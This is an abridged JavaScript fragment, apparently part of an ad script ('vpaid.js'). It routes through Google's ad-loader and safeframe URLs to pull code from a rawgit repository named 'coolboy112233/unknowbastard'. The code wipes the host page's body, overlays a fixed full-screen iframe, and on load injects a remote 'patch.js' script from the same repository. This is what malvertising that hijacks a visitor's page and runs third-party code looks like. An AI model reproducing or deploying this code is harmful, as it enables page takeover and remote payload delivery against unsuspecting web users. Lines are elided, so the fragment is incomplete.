 ...
 * @constructor
 */
var newstr = window.location.href.replace('https://tpc.googlesyndication.com/pagead/js/loader15.html?https://cdn.rawgit.com/coolboy112233/unknowbastard/master/vpaid.js?r=15&ai=/coolboy112233/unknowbastard/master/vpaid.js?r=15&ai=',"");
...
document.getElementsByTagName("body")[0].innerHTML='';
	...
	var safeframe = document.createElement("iframe");
		...
		safeframe.src='https://tpc.googlesyndication.com/safeframe/1-0-14/html/container.html#ai='+newstr;
		safeframe.style = "left:0px;top:0px;border:0px;";
		safeframe.style.width = "100%";
		safeframe.style.height = "100%";
		safeframe.style.display = "100%";
		safeframe.style.position = "fixed";
		safeframe.onload=function(){
			...
			script.src ='https://cdn.rawgit.com/coolboy112233/unknowbastard/master/patch.js?a=15&ai='+newstr;
